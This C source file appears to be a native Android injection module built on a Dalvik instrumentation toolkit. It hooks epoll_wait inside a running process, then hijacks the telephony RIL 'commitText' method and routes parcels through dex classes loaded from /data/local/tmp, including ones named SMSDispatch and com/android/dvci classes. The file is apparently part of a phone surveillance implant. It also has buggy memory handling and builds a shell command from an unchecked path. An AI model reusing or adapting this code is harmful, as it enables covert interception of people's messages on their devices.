/*
 *  Collin's Dynamic Dalvik Instrumentation Toolkit for Android
 *  Collin Mulliner <collin[at]mulliner.org>
 *
 *  (c) 2012,2013
 *
 *  License: LGPL v2.1
 *
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <string.h>
#include <termios.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <stdlib.h>
#include <jni.h>

#include "hook.h"
#include "dexstuff.h"
#include "dalvik_hook.h"
#include "base.h"

#undef log
//#define USE_BD
#define DEBUG
#ifdef DEBUG
/*
 * Android log priority values, in ascending priority order.
 */
typedef enum android_LogPriority
{
   ANDROID_LOG_UNKNOWN = 0, ANDROID_LOG_DEFAULT, /* only for SetMinPriority() */
   ANDROID_LOG_VERBOSE, ANDROID_LOG_DEBUG, ANDROID_LOG_INFO, ANDROID_LOG_WARN, ANDROID_LOG_ERROR, ANDROID_LOG_FATAL, ANDROID_LOG_SILENT, /* only for SetMinPriority(); must be last */
} android_LogPriority;

//memset(tag,0,256-1);
char tag[256];
#define log(...) {\
tag[0]=tag[1]=0;\
snprintf(tag,256,"ikey:%s",__FUNCTION__);\
__android_log_print(ANDROID_LOG_DEBUG, tag , __VA_ARGS__);}
#define logf(...) {FILE *f = fopen("/data/local/tmp/log", "a+");\
        if(f!=NULL){\
        fprintf(f,"%s: ",__FUNCTION__);\
        fprintf(f, __VA_ARGS__);\
        fflush(f); fclose(f); }}
#else
#define log(...)
#endif
struct dalvik_cache_t
{
   // for the call inside the hijack
   jclass cls_h;
   jmethodID mid_h;
};

static struct hook_t eph;
static struct dexstuff_t d;
static struct dalvik_hook_t commitText_dh;
static struct dalvik_cache_t commitText_cache;

// switch for debug output of dalvikhook and dexstuff code
static int debug;

static void my_log(char *msg)
{
   log("%s", msg)
}
static void my_log2(char *msg)
{
   if (debug)
      log("%s", msg);
}
long int and_maj = -1;
long int and_min = -1;
long int and_rel = -1;
static void get_android_version()
{
   char android_version[10] = "";
   char *command = "getprop ro.build.version.release";
   FILE *fp = popen(command, "r");
   if (fgets(android_version, sizeof(android_version), fp) != NULL) {
      and_maj = strtol(&android_version[0], NULL, 10);
      and_min = strtol(&android_version[2], NULL, 10);
      and_rel = strtol(&android_version[4], NULL, 10);

      log("[*] version %s %d.%d.%d\n", android_version, and_maj, and_min, and_rel);
   } else {
      log("failed to get version\n");
   }
   if (fp) {
      pclose(fp);
   }
}
char * _fgetln(FILE *stream, size_t *len)
{
   static char *buffer = NULL;
   static size_t buflen = 0;
   if (stream == NULL) {
      log("stream null \n");
      return NULL;
   }
   if (buflen == 0) {
      buflen = 512;
      if ((buffer = malloc(buflen + 1)) == NULL) {
         log("fatal: malloc: out of memory");
         return NULL;
      }
   }
   if (fgets(buffer, buflen + 1, stream) == NULL) {
      log("no data available");
      free(buffer);
      return NULL;
   }
   *len = strlen(buffer);
   while (*len == buflen && buffer[*len - 1] != '\n') {
      char *tmp_buffer = NULL;
      if ((tmp_buffer = realloc(buffer, 2 * buflen + 1)) == NULL) {
         log("fatal: realloc: out of memory");
         free(buffer);
         return NULL;
      }
      buffer = tmp_buffer;
      if (fgets(buffer + buflen, buflen + 1, stream) == NULL) {
         log("no more data available");
         free(buffer);
         return NULL;
      }
      *len += strlen(buffer + buflen);
      buflen *= 2;
   }
   return buffer;
}
ssize_t getline(char **lineptr, size_t *n, FILE *stream)
{
   char *ptr;
   if (stream == NULL) {
      log("stream null \n");
      return -1;
   }
   ptr = _fgetln(stream, n);
   if (ptr == NULL) {
      log("ptr null \n");
      return -1;
   }
   /* Free the original ptr */
   if (*lineptr != NULL)
      free(*lineptr);
   /* Add one more space for '\0' */
   size_t len = *n + 1;
   /* Update the length */
   n[0] = len;
   /* Allocate a new buffer */
   *lineptr = malloc(len);
   if (*lineptr) {
      log("failed to malloc %d \n", len);
      return -1;
   }
   /* Copy over the string */
   memcpy(*lineptr, ptr, len - 1);
   /* Write the NULL character */
   (*lineptr)[len - 1] = '\0';
   /* Return the length of the new buffer */
   log("got %d :%s \n");
   return len;
}
// returned char pointer must be freed by the caller
static char * get_gobbler_pat(char *path)
{
   char *line = NULL;
   char *command = NULL;
   int read = 0, len;
   if (path == NULL || strlen(path) <= 0) {
      log("invalid path passed\n");
      return line;
   }
   // allocate "ls " and the \0 plus strlen path
   size_t cmd_len = strlen(path) + 4;
   if (cmd_len > 512) {
      log("invalid path too long\n");

   }
   log("allocating %d long string", cmd_len);
   command = malloc(cmd_len);
   if (command == NULL) {
      log("failed to alloc memory");
      return line;
   }
   memset(command, cmd_len, '\0');
   snprintf(command, cmd_len, "ls %s", path);
   log("calling %s", command);
   FILE *fp = popen(command, "r");
   if (fp) {
      while ((read = getline(&line, &len, fp)) != -1) {
         log("[*] files %s \n", line);
      }
      if (line) {
         if (strstr(line, path) == NULL) {
            free(line);
            log("failed to get gobbler\n");
         } else {
            log("got file %s\n", line);
         }
      }
   } else {
      log("failed to call %s\n", command);
   }
   if (command) {
      free(command);
      command = NULL;
   }
   if (fp) {
      pclose(fp);
   }
   return line;
}

static int load_dext(char * dext_path, char **classes)
{

   int cookie = 0;
   int res = 0;
   char *file = dext_path;
   if (dext_path == NULL) {
      log(" loaddex null path passed\n");
      return 1;
   }
   if (strstr(dext_path, "*") != NULL) {
      log(" loaddex gobbler passed\n");
      file = get_gobbler_pat(dext_path);
      if (file != NULL) {
         cookie = dexstuff_loaddex(&d, file);
      } else {
         file = dext_path;
      }
      return 1;
   }
   cookie = dexstuff_loaddex(&d, file);
   log("loaddex res = %x\n", cookie)
   if (!cookie) {
      char *dext_file = file;
      while (strstr(dext_file, "/") != NULL) {
         dext_file = strstr(dext_file, "/");
      }
      if (dext_file == NULL) {
         dext_file = "";
      }
      log("make sure /data/dalvik-cache/ is world writable and delete data@local@tmp@%s", dext_file);
      res = 1;
   }
   if (res == 0) {
      int i = 0;
      void *clazz = NULL;
      if (classes) {
         while (classes[i] != NULL) {
            log("loading class %s", classes[i]);
            clazz = dexstuff_defineclass(&d, classes[i], cookie);
            log("Cfg = 0x%x\n", clazz);
            if (clazz == 0) {
               log("failure loading class %s", classes[i]);
               res = 1;
               break;
            }
            i++;
         }
      }
   }
   if (file != dext_path) {
      log("Freeing file\n");
      free(file);
   }

   return res;
}
static int icommitText(JNIEnv *env, jobject this, jobject p)
{
   jint callOrig = 1;
   int doit = 1;
   //log("start! c=0x%x m=0x%x\n", processUnsolicited_cache.cls_h, processUnsolicited_cache.mid_h);
   (*env)->MonitorEnter(env, this);
   char *classes[] = { "phone/android/com/SMSDispatch", "phone/android/com/Reflect", "com/android/dvci/util/LowEventHandlerDefs", NULL };
   //if (processUnsolicited_cache.cls_h == 0) {
   if (load_dext("/data/local/tmp/ddiclasses.dex", classes)) {
      log("failed to load class ");
      doit = 0;
   }
   //} else {
   //   log("using cache");
   //}

   if (doit) {
      // call static method and passin the sms
      //log(" parcel = 0x%x\n", p)
      //if (processUnsolicited_cache.cls_h == 0) {
      commitText_cache.cls_h = (*env)->FindClass(env, "phone/android/com/SMSDispatch");
      //}
      if (commitText_cache.cls_h != 0) {
         //if (processUnsolicited_cache.mid_h == 0) {
         commitText_cache.mid_h = (*env)->GetStaticMethodID(env, commitText_cache.cls_h, "dispatchParcel", "(Landroid/os/Parcel;)I");
         //}
         if (commitText_cache.mid_h) {
            callOrig = (*env)->CallStaticIntMethod(env, commitText_cache.cls_h, commitText_cache.mid_h, p);
         } else {
            log("method not found!\n")
         }
      } else {
         log("phone/android/com/SMSDispatch not found!\n")
      }
   }
   // call original SMS dispatch method
   if ((*env)->ExceptionOccurred(env)) {
      log("got an exception!!");
      (*env)->ExceptionDescribe(env);
      (*env)->ExceptionClear(env);
   }
   (*env)->MonitorExit(env, this);
   dalvik_prepare(&d, &commitText_dh, env);

   if (callOrig) {

      (*env)->CallVoidMethod(env, this, commitText_dh.mid, p);
      if ((*env)->ExceptionOccurred(env)) {
         log("got an exception!!");
         (*env)->ExceptionClear(env);
      } else {
         log("success calling : %s\n", commitText_dh.method_name)
      }
   } else {
      //log("skipping pdu args for call : %s\n", processUnsolicited_dh.method_name)
      callOrig = 1;
   }
   dalvik_postcall(&d, &commitText_dh);

   return callOrig;
}

static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout)
{
   int (*orig_epoll_wait)(int epfd, struct epoll_event *events, int maxevents, int timeout);
   orig_epoll_wait = (void*) eph.orig;
   // remove hook for epoll_wait
   hook_precall(&eph);

   // resolve symbols from DVM
   dexstuff_resolv_dvm(&d);
   log("my_epoll_wait: try_hook\n")
   /* Android < 4.4.x*/
   if (and_maj == 4 && and_min < 4) {
      //private void processUnsolicited (Parcel p) {
      commitText_cache.cls_h = NULL;
      commitText_cache.mid_h = NULL;
      dalvik_hook_setup(&commitText_dh, "Lcom/android/internal/telephony/RIL;", "commitText", "(Landroid/os/Parcel;)V", 3, icommitText);
      if (dalvik_hook(&d, &commitText_dh)) {
         log("my_epoll_wait: hook processUnsolicited ok\n")
      } else {
         log("my_epoll_wait: hook processUnsolicited fails\n")
      }
   } else if (and_maj == 4 && and_min >= 4) {

      //private void processUnsolicited (Parcel p) {
      commitText_cache.cls_h = NULL;
      commitText_cache.mid_h = NULL;
      dalvik_hook_setup(&commitText_dh, "Lcom/android/internal/telephony/RIL;", "commitText", "(Landroid/os/Parcel;)V", 3, icommitText);
      if (dalvik_hook(&d, &commitText_dh)) {
         log("my_epoll_wait: hook processUnsolicited ok\n")
      } else {
         log("my_epoll_wait: hook processUnsolicited fails\n")
      }
   } else {
      log("injection not possible \n");
      return 1;
   }
   int res = orig_epoll_wait(epfd, events, maxevents, timeout);
   return res;
}

// set my_init as the entry point
void __attribute__ ((constructor)) my_init(void);

void my_init(void)
{
   log("started\n");
   get_android_version();
   debug = 1;
   // set log function for  libbase (very important!)
   set_logfunction(my_log2);
   // set log function for libdalvikhook (very important!)
   dalvikhook_set_logfunction(my_log2);

   hook(&eph, getpid(), "libc.", "epoll_wait", my_epoll_wait, 0);
   dexstuff_resolv_dvm(&d);
   //dalvik_dump_class(&d,"");
}
